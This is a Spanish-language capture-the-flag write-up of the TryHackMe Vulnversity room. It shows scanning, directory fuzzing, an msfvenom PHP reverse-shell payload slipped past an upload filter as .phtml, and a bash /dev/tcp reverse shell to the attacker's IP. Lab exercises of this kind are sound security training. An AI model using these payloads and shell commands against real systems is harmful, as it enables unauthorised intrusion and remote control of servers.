Maquinas a utilizar **Kali Linux y** [https://tryhackme.com/room/vulnversity](https://tryhackme.com/room/vulnversity)

  

Es posible que en diversas ocasiones no podamos subir directamente un archivo en .php dentro de un panel de subida de archivos, por lo que tenemos que encontrar la forma de hacer un bypass de este tipo de restricciones; y una de las posibles formas es cambiar la extensión de nuestro payload, para que no sea .php pero que a su vez también funcione con php.

  

- Configuración del laboratorio.
    
    - Antes de arrancar nuestra Kali Linux ponemos nuestro adaptador de red como adaptador puente . Y arrancamos la maquina.
        
        ![[Imagenes/image 34.png|image 34.png]]
        
    
      
    
    - Entramos en la web de la maquina vulnversity y nos registremos .
    - Nos vamos al botón Access Machines en la parte superior de la pagina.
        
        ![[Imagenes/image 1 23.png|image 1 23.png]]
        
    - Escogemos Linux y pulsamos al enlace Download donde nos descargara un archivo para una conexión VPN.
    - Copiamos el archivo al escritorio de nuestra maquina Kali Linux.
    - Abrimos un terminal y ejecutamos el siguiente comando como **root**.
        
        ![[Imagenes/image 2 22.png|image 2 22.png]]
        
          
        
        ![[Imagenes/image 3 21.png|image 3 21.png]]
        
    
      
    
    - Pulsamos en Start Machine
        
        ![[Imagenes/image 4 20.png|image 4 20.png]]
        
    
      
    
    - Esperamos hasta que nos muestre la IP de nuestra maquina victima.
        
        ![[Imagenes/image 5 19.png|image 5 19.png]]
        
          
        
    - Sin cerrar el terminal que tenemos abierto. Abrimos otra terminal en nuestra maquina Kali. y hacemos un ping a nuestra maquina victima para verificar la conectividad.
        
        ```Bash
        ping -c 1 10.10.191.250 
        ```
        
        ![[Imagenes/image 6 17.png|image 6 17.png]]
        
          
        
    - Como estamos a través de un VPN si hacemos un `ifconfig` nos mostrara una **nueva interface de red** llamada **turn0**. Que es la que vamos a utilizar y nuestra IP será en mi caso **10.21.166.149.**
        
        ![[Imagenes/image 7 15.png|image 7 15.png]]
        

  

---

  

- Vamos hacer un nmap a la maquina victima.
    
    ```Bash
    nmap -p- -sS -sV -sC --open -min-rate 5000 -n -vvv -Pn 10.10.191.250
    ```
    
    ![[Imagenes/image 8 14.png|image 8 14.png]]
    
    Nos fijamos que tiene levantado un **servidor web en el puerto 3333**.
    
      
    
- Abrimos el navegador y copiamos la IP de la maquina victima en la URL. Pero como el servidor web no esta corriendo por el puerto 80 que es el de por defecto debemos indicarle el puerto.
    
    `**http://10.10.191.250:3333/**`
    
    ![[Imagenes/image 9 13.png|image 9 13.png]]
    

  

- Hacemos **Fuzzing Web** utilizando la IP de la maquina victima y el puerto donde esta corriendo el servidor web.
    
    ```Bash
    gobuster dir -u http://10.10.191.250:3333/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
    ```
    
    ![[Imagenes/image 10 13.png|image 10 13.png]]
    
    Nos encontró un directorio que se llama internal
    
- Probamos la URL en el navegador web
    
    ![[Imagenes/image 11 10.png|image 11 10.png]]
    

Tenemos un panel de subidas de archivos. Podríamos crear un php malicioso con msfvenom para tener control remoto de la maquina. Pero esto en ocasionas no es posible por que la web tiene algún tipo de limitador que impide subir archivos en php, algo normal por que dejar subir archivos php es un fallo de seguridad.

Vamos a intentar hacer un bypass a esta limitación.

  

- Creamos con msfvenom un playload con extensión php.
    
    ```Bash
    msfvenom -p php/reverse_php LHOST=10.21.166.149 LPORT=443 -f raw > pwned2.php 
    ```
    
    ![[Imagenes/image 12 10.png|image 12 10.png]]
    
      
    
- Le cambiamos **la extensión a phtml que a efectos prácticos seria como si fuera php.**
    
    ```Bash
    mv pwned2.php pwned2.phtml
    ```
    
    ![[Imagenes/image 13 10.png|image 13 10.png]]
    

  

- Vamos a subirlo por la pagina web.
    
    ![[Imagenes/image 14 8.png|image 14 8.png]]
    

  

- Volvemos a hacer **Fuzzing Web** pero esa vez dentro del directorio **internal** para ver si encontramos donde guarda los archivos.
    
    ```Bash
    gobuster dir -u http://10.10.191.250:3333/internal/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
    ```
    
    ![[Imagenes/image 15 7.png|image 15 7.png]]
    

  

- Escribimos en el navegador la URL `http://10.10.191.250:3333/internal/uploads/`
    
    ![[Imagenes/image 16 4.png|image 16 4.png]]
    
- Ponemos netcat a la escucha en el puerto que habíamos escogido en msfvenom.
    
    ```Bash
    nc -nlvp 443
    ```
    

  

- Ejecutamos nuestro archivo en el navegador y tendríamos la conexión
    
    ![[Imagenes/image 17 3.png|image 17 3.png]]
    
- Recordemos que las conexiones con netcat y msfvenom no duran mucho tiempo así que tenemos que estabilizarla.
    
    - En otra terminal nos ponemos a la escucha en otro puerto , por ejemplo en el 444
    - Usaremos la web **[Online - Reverse Shell Generator](https://www.revshells.com/)** para crear la revershell.
        
        ![[Imagenes/image 18 2.png|image 18 2.png]]
        
          
        
    - En la conexión del puerto 443 escribimos lo siguiente:
        
        `bash -c "``**sh**` `-i >& /dev/tcp/``**10.21.166.149**``/``**444**` `0>&1"`  
          
        
        ![[Imagenes/image 19 2.png|image 19 2.png]]
        
    
      
    
    - Ya tendíamos una conexión estable.
        
        ![[Imagenes/image 20 2.png|image 20 2.png]]